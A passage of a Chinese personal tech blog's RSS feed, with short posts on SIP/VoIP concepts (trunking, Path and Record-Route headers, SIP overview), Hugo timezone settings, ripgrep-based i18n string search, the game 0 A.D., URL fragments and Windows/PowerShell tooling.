&lt;li&gt;&lt;strong&gt;节约话费成本&lt;/strong&gt;：企业可以通过设置目的地址任意选择并连接到多个ITSP，充分利用遍布全球各地的ITSP，节省通话费用。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能强大&lt;/strong&gt;：部署SIP Trunk设备后，全网可以使用SIP协议，可以更好的支持语音、会议、即时消息等IP通信业务。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;处理信令和媒体&lt;/strong&gt;：SIP Trunk设备不同于SIP代理服务器。SIP Trunk设备接收到用户的呼叫请求后，会代表用户向ITSP发起新呼叫请求。在转发过程中，SIP Trunk设备不但要对信令消息进行中继转发，对RTP媒体消息也需要进行中继转发。在整个过程中，SIP Trunk设备两端的设备（企业内部和企业外部设备）均认为和其交互的是SIP Trunk设备本身。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.h3c.com/cn/d_201009/688762_30003_0.htm&#34;&gt;http://www.h3c.com/cn/d_201009/688762_30003_0.htm&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://getvoip.com/blog/2013/01/24/differences-between-sip-trunking-and-hosted-pbx/&#34;&gt;https://getvoip.com/blog/2013/01/24/differences-between-sip-trunking-and-hosted-pbx/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.onsip.com/blog/hosted-pbx-vs-sip-trunking&#34;&gt;https://www.onsip.com/blog/hosted-pbx-vs-sip-trunking&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://baike.baidu.com/item/sip%20trunk/1499860&#34;&gt;https://baike.baidu.com/item/sip%20trunk/1499860&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>Path头简史</title>
      <link>https://wdd.js.org/opensips/ch1/sip-path/</link>
      <pubDate>Sat, 03 Sep 2022 14:51:32 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch1/sip-path/</guid>
      <description>&lt;p&gt;RFC3261并没有介绍关于Path头的定义，因为这个头是在RFC3327中定义的，Path头作为一个SIP的扩展头。&lt;/p&gt;
&lt;p&gt;RFC3327的标题是：Session Initiation Protocol (SIP) Extension Header Field for Registering Non-Adjacent Contacts。&lt;/p&gt;
&lt;p&gt;从这个标题可以看出，Path头是作为Register请求的一个消息头，一般这个头只在注册消息上才有。&lt;/p&gt;
&lt;p&gt;这个头的格式如下。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Path: &amp;lt;sip:P1.EXAMPLEVISITED.COM;lr&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;从功能上说，Path头和record-route头的功能非常相似，但是也不同。&lt;/p&gt;
&lt;p&gt;看下面的一个场景，uac通过p1和p2, 将注册请求发送到uas, 在某一时刻，uac作为被叫，INVITE请求要从uas发送到uac, 这时候，INVITE请求应该怎么走？&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/sip-path/2022-09-03-15-22-01.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;假如我们希望INVITE请求要经过p2,p2,然后再发送到uac, Path头的作用就是这个。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/sip-path/2022-09-03-15-22-15.png&#34;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;注册请求经过P1时，P1在注册消息上加上p1地址的path头&lt;/li&gt;
&lt;li&gt;注册请求经过P2时，P2在注册消息上加上p2地址的path头&lt;/li&gt;
&lt;li&gt;注册请求到达uas时，uas从Contact头上获取到uac的地址信息，然后从两个Path头上获取到如下信息：如果要打电话给uac, Path头会转变为route头，用来定义INVITE请求的路径。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;简单定义：Path头用来一般在注册消息里，Path头定义了uac作为被叫时，INVITE请求的发送路径。&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;</description>
    </item>
    <item>
      <title>Hugo Timezone没有设置， 导致页面无法渲染</title>
      <link>https://wdd.js.org/posts/2022/09/hugo-timezone/</link>
      <pubDate>Sat, 03 Sep 2022 10:20:48 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/09/hugo-timezone/</guid>
      <description>&lt;p&gt;写好了博客，但是没有在网页上渲染出来，岂不是很气人！&lt;/p&gt;
&lt;p&gt;我的archtypes/default.md配置如下&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;---
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;title: &amp;#34;{{ replace .Name &amp;#34;-&amp;#34; &amp;#34; &amp;#34; | title }}&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;date: &amp;#34;{{ now.Format &amp;#34;2006-01-02 15:04:05&amp;#34; }}&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;draft: false
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;---
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当使用 &lt;code&gt;hugo new&lt;/code&gt; 创建一个文章的时候，有如下的头&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;---
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;title: &amp;#34;01: 学习建议&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;date: &amp;#34;2022-09-03 10:23:10&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;draft: false
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;---
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Hugo 默认采用的是 格林尼治平时 (GMT)，比北京时间 (UTC+8) 晚了 8 个小时，Hugo 在生成静态页面的时候，不会生成超过当前时间的文章。&lt;/p&gt;
&lt;p&gt;如果把北京时间当作格林尼治时间来计算，那么肯定还没有超过当前时间。&lt;/p&gt;
&lt;p&gt;所以我们要给站点设置时区。&lt;/p&gt;
&lt;p&gt;在config.yaml增加如下内容&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;timeZone&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Asia/Shanghai&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Via route Record-Route的区别</title>
      <link>https://wdd.js.org/opensips/ch1/via-route-record-route/</link>
      <pubDate>Sat, 03 Sep 2022 02:00:00 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch1/via-route-record-route/</guid>
      <description>&lt;pre class=&#34;mermaid&#34;&gt;sequenceDiagram
    title French Words I Know
    autonumber
    participant a
    participant p1
    participant p2
    participant p3
    participant b

    a-&amp;gt;&amp;gt;p1 : INVITE route: p1, via: a
    p1-&amp;gt;&amp;gt;p2: INVITE via: a,p1, rr: p1
    p2-&amp;gt;&amp;gt;p3: INVITE via: a,p1,p2 rr: p1,p2
    p3-&amp;gt;&amp;gt;b: INVITE via: a,p1,p2,p3 rr: p1,p2,p3

    b--&amp;gt;&amp;gt;p3: 180 via: a,p1,p2,p3 rr: p1,p2,p3
    p3--&amp;gt;&amp;gt;p2: 180 via: a,p1,p2 rr: p1,p2,p3
    p2--&amp;gt;&amp;gt;p1: 180 via: a,p1 rr: p1,p2,p3
    p1--&amp;gt;&amp;gt;a: 180 via: a rr: p1,p2,p3

    b--&amp;gt;&amp;gt;p3: 200 OK via: a,p1,p2,p3 rr: p1,p2,p3
    p3--&amp;gt;&amp;gt;p2: 200 Ok via: a,p1,p2 rr: p1,p2,p3
    p2--&amp;gt;&amp;gt;p1: 200 Ok via: a,p1 rr: p1,p2,p3
    p1--&amp;gt;&amp;gt;a: 200 Ok via: a rr: p1,p2,p3

    a-&amp;gt;&amp;gt;p1 : ACK via: a, route: p1,p2,p3
    p1-&amp;gt;&amp;gt;p2: ACK via: a,p1, route: p2,p3
    p2-&amp;gt;&amp;gt;p3: ACK via: a,p1,p2 route: p3
    p3-&amp;gt;&amp;gt;b: ACK via: a,p1,p2,p3
&lt;/pre&gt;
&lt;p&gt;rr代表record-route头。&lt;/p&gt;</description>
    </item>
    <item>
      <title>SIP协议简介</title>
      <link>https://wdd.js.org/opensips/ch1/sip-overview/</link>
      <pubDate>Fri, 02 Sep 2022 01:00:00 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch1/sip-overview/</guid>
      <description>&lt;p&gt;SIP是VoIP的基石，相当于HTTP协议在Web服务器里的角色。如果你熟悉HTTP协议，那么你可以在SIP协议中找到许多和HTTP中熟悉的东西，例如请求头，请求体，响应码之类概念，这是因为SIP协议的设计，很大程度上参考了HTTP协议。&lt;/p&gt;
&lt;p&gt;如果想要学习VoIP，那么SIP协议是你务必掌握敲门砖。&lt;/p&gt;
&lt;h1 id=&#34;1-sip组件&#34;&gt;1. SIP组件&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;UAC: 例如sip终端，软电话，话机&lt;/li&gt;
&lt;li&gt;UAS: sip服务器&lt;/li&gt;
&lt;li&gt;UA: ua既可以当做uac也可以当做uas&lt;/li&gt;
&lt;li&gt;代理服务器&lt;/li&gt;
&lt;li&gt;重定向服务器&lt;/li&gt;
&lt;li&gt;注册服务器&lt;/li&gt;
&lt;li&gt;网关&lt;/li&gt;
&lt;li&gt;PSTN 公共交换电话网&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;2-sbc-边界会话控制器&#34;&gt;2. SBC 边界会话控制器&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/sip-overview/2022-09-02-14-17-18.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;SBC是Session Border Controller的缩写，具有一下几个功能。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;拓扑隐藏：隐藏所有内部网络的信息。&lt;/li&gt;
&lt;li&gt;媒体流管理：设置语音流编码规则，转换等&lt;/li&gt;
&lt;li&gt;增加能力：例如Refer, 3PCC&lt;/li&gt;
&lt;li&gt;维护NAT映射：&lt;/li&gt;
&lt;li&gt;访问控制&lt;/li&gt;
&lt;li&gt;媒体加密：例如外部网络用SRTP, 内部网络用RTP&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;3-sip注册过程&#34;&gt;3. sip注册过程&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/sip-overview/2022-09-02-14-17-43.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;下面简化注册逻辑，省略了验证和过期等字段：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;对于分机来说，注册服务器的地址是需要设置的&lt;/li&gt;
&lt;li&gt;分机向注册服务器发请求，说：你好，注册服务器，我是8005，我的地址是200.180.1.1，以后你可以用这个地址联系我。&lt;/li&gt;
&lt;li&gt;注册服务器回复：好的，注册成功&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;4-sip服务器的类型&#34;&gt;4. sip服务器的类型&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/sip-overview/2022-09-02-14-18-13.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;41-代理服务器&#34;&gt;4.1. 代理服务器&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/sip-overview/2022-09-02-14-18-27.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;42-重定向服务器&#34;&gt;4.2. 重定向服务器&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/sip-overview/2022-09-02-14-18-43.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;43-背靠背ua服务器&#34;&gt;4.3. 背靠背UA服务器&lt;/h2&gt;
&lt;p&gt;背靠背UA服务器有两个作用&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;隐藏网络拓扑结构&lt;/li&gt;
&lt;li&gt;有些时候，路由无法到达，只能用背靠背UA服务器&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/sip-overview/2022-09-02-14-19-37.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;5-常用sip请求方法&#34;&gt;5. 常用sip请求方法&lt;/h1&gt;
&lt;p&gt;比较常用的是下面的&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/sip-overview/2022-09-02-14-20-12.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;常用的几个是：register, invite, ack, bye, cancel。除了cancel和ack不需要认证外，其余的请求都需要认证。
register自不必说，invite和bye是需要认证的。&lt;/p&gt;
&lt;p&gt;对于我们不信任的ua，我们不允许他们呼叫。对于未认证的bye，也需要禁止。后者可以防止恶意的bye请求，挂断正常的呼叫。&lt;/p&gt;
&lt;p&gt;invite除了re-invite的情况，其余的都属于初始化请求，需要着重关心的。而对于bye这种序列化请求，只需要按照record-route去路由。&lt;/p&gt;
&lt;h1 id=&#34;6-sip响应状态码&#34;&gt;6. sip响应状态码&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/sip-overview/2022-09-02-14-20-34.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;7-sip对话流程图&#34;&gt;7. sip对话流程图&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/sip-overview/2022-09-02-14-21-11.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>学习建议</title>
      <link>https://wdd.js.org/opensips/ch1/study-tips/</link>
      <pubDate>Fri, 02 Sep 2022 00:00:00 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch1/study-tips/</guid>
      <description>&lt;h1 id=&#34;1-概念理解&#34;&gt;1. 概念理解&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;务必要能理解SIP的重要概念，特别是事务、Dialog。参考https://www.yuque.com/wangdd/opensips/fx5pyy&lt;/li&gt;
&lt;li&gt;概念是非常重要的东西，不理解概念，越学就会越吃力&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;2-时序图&#34;&gt;2. 时序图&lt;/h1&gt;
&lt;p&gt;时序图是非常重要的，培训时，一般我会要求学员务必能够手工绘制时序图。因为只有能够手工绘制时序图了，在排查问题时，才能够从抓包工具给出的时序图中分析出问题所在。&lt;/p&gt;
&lt;p&gt;RFC3665 &lt;a href=&#34;https://datatracker.ietf.org/doc/html/rfc3665&#34;&gt;https://datatracker.ietf.org/doc/html/rfc3665&lt;/a&gt; 中提供了很多经典的时序图，建议可以去临摹。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/study-tips/2022-09-02-14-06-24.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>读书笔记 - Packet Guide to VoIP</title>
      <link>https://wdd.js.org/posts/2022/07/vl3zhk/</link>
      <pubDate>Mon, 18 Jul 2022 20:05:01 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/07/vl3zhk/</guid>
      <description>&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;书名&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;Packet Guide to Voip over IP&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;作者&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;Bruce Hartpence&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;状态&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;已读完&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;简介&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;Go under the hood of an operating Voice over IP network, and build your knowledge of protocol &amp;hellip;.&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;读后感&#34;&gt;读后感&lt;/h2&gt;
&lt;h3 id=&#34;新技术出现的时机&#34;&gt;新技术出现的时机&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Pulling the trigger early might put you at risk of making the wrong decision in terms of
vendor or protocol. Adopting late might put you behind the competition or make you
rush to deploy a system that is not well understood by the local staff.&lt;/p&gt;</description>
    </item>
    <item>
      <title>中途多语言适配</title>
      <link>https://wdd.js.org/posts/2022/07/mv0hk1/</link>
      <pubDate>Tue, 12 Jul 2022 22:54:55 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/07/mv0hk1/</guid>
      <description>&lt;h1 id=&#34;1-前提说明&#34;&gt;1. 前提说明&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;项目已经处于维护期&lt;/li&gt;
&lt;li&gt;项目一开始并没有考虑多语言，所以很多地方都是写死的中文&lt;/li&gt;
&lt;li&gt;现在要给这个项目添加多语言适配&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;2-工具选择&#34;&gt;2. 工具选择&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.npmjs.com/package/i18n&#34;&gt;https://www.npmjs.com/package/i18n&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.npmjs.com/package/vue-i18n&#34;&gt;https://www.npmjs.com/package/vue-i18n&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;3-难点&#34;&gt;3. 难点&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;项目很大，中文可能存在于各种文件中，例如html, vue, js, typescript等等， 人工查找不现实&lt;/li&gt;
&lt;li&gt;所以首先第一步是要找出所有的中文语句&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;4-让文本飞&#34;&gt;4. 让文本飞&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;安装ripgrep &lt;code&gt;apt-get instal ripgrep&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;搜索所有包含中文的代码: &lt;code&gt;rg -e &#39;[\p{Han}]&#39; &amp;gt; han.all.md&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;给所有包含中文的代码，按照文件名，和出现的次数排序:  &lt;code&gt;cat han.all.md | awk -F: &#39;{print  $1}&#39; | uniq -c | sort -nr &amp;gt; stat.han.md&lt;/code&gt;  这一步主要是看看哪些文件包含的中文比较多&lt;/li&gt;
&lt;li&gt;按照中文的语句，排序并统计出现的次数: &lt;code&gt;cat han.all.md |rg -o -e &#39;([\p{Han}]+)&#39; | sort | uniq -c | sort -nr &amp;gt; word.han.md&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;经过上面4步，基本上可以定位出哪些代码中包含中文，中文的语句有哪些。&lt;/p&gt;</description>
    </item>
    <item>
      <title>0 A.D. 一款开发了21年还未release的游戏</title>
      <link>https://wdd.js.org/posts/2022/07/gxog1n/</link>
      <pubDate>Tue, 12 Jul 2022 19:32:28 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/07/gxog1n/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/07/gxog1n/2022-10-29-19-55-32.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;1-我为什么会知道0-ad-这款游戏&#34;&gt;1. 我为什么会知道0 A.D. 这款游戏？&lt;/h1&gt;
&lt;p&gt;最近切换到windows开发，用了&lt;a href=&#34;https://scoop.sh/#/&#34;&gt;scoop&lt;/a&gt;这个包管理工具来安装软件，随便逛逛的时候，发现scoop还可以用来安装游戏，然后我就在里面看了一下，然后排名第一的是一个名叫 0 A.D.的游戏，然后我就安装，并试玩了一下。&lt;/p&gt;
&lt;h1 id=&#34;2-0-ad-这个名字是啥意思&#34;&gt;2. 0 A.D. 这个名字是啥意思？&lt;/h1&gt;
&lt;p&gt;基督教称耶稣诞生的那年为公元元年， A.D. 就是Anno Domini（A.D.）（拉丁）的缩写，对应的公元前就是而在耶稣诞生之前，称为B.C. Before Christ（B.C.）.&lt;/p&gt;
&lt;p&gt;我们现在的阳历，例如今年是2022年，这其实就是公元2022年。对应的公元元年，对中国来说，大致在西汉年间。&lt;/p&gt;
&lt;p&gt;所以 0 A.D. 其实的意思就是一个不存在的元年。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;“0 A.D.” is a time period that never actually existed:&lt;/strong&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;h1 id=&#34;3-0-ad-是什么类型的游戏&#34;&gt;3. 0 A.D. 是什么类型的游戏？&lt;/h1&gt;
&lt;p&gt;如果你玩过红警，0 A.D.的有点像红警。 官方的介绍0AD是一个基于历史的实时策略游戏。 &lt;!-- raw HTML omitted --&gt;如果你玩过部落冲突，0AD其实也有点类似部落冲突。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/07/gxog1n/2022-10-29-19-55-45.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/07/gxog1n/2022-10-29-19-55-52.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;4-0-ad--有什么特点&#34;&gt;4. 0 A.D.  有什么特点？&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;跨平台， windows, mac, linux都可以玩&lt;/li&gt;
&lt;li&gt;免费&lt;/li&gt;
&lt;li&gt;历史悠久，项目开始于2001&lt;/li&gt;
&lt;li&gt;还处于开发阶段&lt;/li&gt;
&lt;li&gt;可玩性还不错&lt;/li&gt;
&lt;li&gt;基于真实历史，所以玩游戏的时候，也是能够学点历史的。里面有是14个文明。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;5-有哪些玩法&#34;&gt;5. 有哪些玩法&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;单机和AI对战&lt;/li&gt;
&lt;li&gt;在线组队玩&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;6-faq&#34;&gt;6. FAQ&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;如何设置中文界面
&lt;ul&gt;
&lt;li&gt;默认的游戏不带中文语言的，实际上它是有中文的语言包的，可以参考&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://baike.baidu.com/item/%E5%85%AC%E5%85%83/17855&#34;&gt;https://baike.baidu.com/item/%E5%85%AC%E5%85%83/17855&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>请问nginx 能否根据 frag 片段 进行路径转发？</title>
      <link>https://wdd.js.org/posts/2022/07/gt6a84/</link>
      <pubDate>Sat, 09 Jul 2022 17:13:13 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/07/gt6a84/</guid>
      <description>&lt;h1 id=&#34;http-url的格式复习&#34;&gt;HTTP URL的格式复习&lt;/h1&gt;
&lt;p&gt;&lt;!-- raw HTML omitted --&gt;://&lt;!-- raw HTML omitted --&gt;:&lt;!-- raw HTML omitted --&gt;@&lt;!-- raw HTML omitted --&gt;:&lt;!-- raw HTML omitted --&gt;/&lt;!-- raw HTML omitted --&gt;;&lt;!-- raw HTML omitted --&gt;?&lt;!-- raw HTML omitted --&gt;#frag&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;scheme 协议，             常见的有http, https, file, ftp等&lt;/li&gt;
&lt;li&gt;&lt;!-- raw HTML omitted --&gt;:&lt;!-- raw HTML omitted --&gt; 用户名和密码&lt;/li&gt;
&lt;li&gt;host  主机或者IP&lt;/li&gt;
&lt;li&gt;port  端口号&lt;/li&gt;
&lt;li&gt;path  路径&lt;/li&gt;
&lt;li&gt;params  参数 用的比较少&lt;/li&gt;
&lt;li&gt;query     查询参数&lt;/li&gt;
&lt;li&gt;frag         片段，资源的一部分，浏览器不会把这部分发给服务端&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;关于frag片段&#34;&gt;关于frag片段&lt;/h1&gt;
&lt;p&gt;浏览器加载一个网页，网页可能有很多章节的内容，frag片段可以告诉浏览器，应该将某个特定的点显示在浏览器中。&lt;/p&gt;
&lt;p&gt;例如 &lt;a href=&#34;https://github.com/wangduanduan/jsplumb-chinese-tutorial/blob/master/api/anchors.js#L18&#34;&gt;https://github.com/wangduanduan/jsplumb-chinese-tutorial/blob/master/api/anchors.js#L18&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这里的#L8就是一个frag片段， 当浏览器打开这个页面的时，就会跳到对应的行&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/07/gt6a84/2022-10-29-19-53-53.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>windows 上的命令行体验</title>
      <link>https://wdd.js.org/posts/2022/07/crofgr/</link>
      <pubDate>Sat, 09 Jul 2022 12:43:14 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/07/crofgr/</guid>
      <description>&lt;p&gt;我已经有5年没有用过windows了，再次在windows上搞开发，发现了windows对于开发者来说，友好了不少。&lt;/p&gt;
&lt;p&gt;首先是windows terminal,  这个终端做的还不错。&lt;/p&gt;
&lt;p&gt;其次是一些常用的命令，比如说ssh, scp等，都已经默认附带了，不用再安装。&lt;/p&gt;
&lt;p&gt;还有包管理工具scoop,  命令行提示工具 oh-my-posh,  以及powershell 7 加载一起，基本可以迁移80%左右的linux上的开发环境。&lt;/p&gt;
&lt;p&gt;特别要说明一下scoop， 这个包管理工具，我安装了在linux上常用的一些软件。&lt;/p&gt;
&lt;p&gt;包括有以下的软件，而且软件的版本都还蛮新的。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;0ad           0.0.25b          games  
7zip          22.00            main  
curl          7.84.0_4         main  
curlie        1.6.9            main   
diff-so-fancy 1.4.3            main  
duf           0.8.1            main  
everything                            
gawk          5.1.1            main  
git           2.37.0.windows.1 main   
git-aliases   0.3.5            extras
git-chglog    0.15.1           main   
gzip          1.3.12           main  
hostctl       1.1.2            main  
hugo          0.101.0          main  
jq            1.6              main   
klogg         22.06.0.1289     extras 
make          4.3              main   
neofetch      7.1.0            main  
neovim        0.7.2            main  
netcat        1.12             main   
nodejs-lts    16.16.0          main   
ntop          0.3.4            main   
procs         0.12.3           main   
ripgrep       13.0.0           main  
sudo          0.2020.01.26     main   
tar           1.23             main  
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;另外一个就是powershell 7了，贴下我的profile配置。&lt;/p&gt;</description>
    </item>
    <item>
      <title>powershell oh-my-posh 加载数据太慢</title>
      <link>https://wdd.js.org/posts/2022/07/igur01/</link>
      <pubDate>Sat, 09 Jul 2022 12:31:09 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/07/igur01/</guid>
      <description>&lt;p&gt;每次打开新的标签页，Powershell 都会输出下面的代码&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Loading personal and system profiles took 3566ms.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;时间不固定，有时1s到10s都可能有，时间不固定。 这个加载速度是非常慢的。&lt;/p&gt;
&lt;p&gt;然后我打开一个非oh-my-posh的窗口，输入&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;oh-my-posh debug
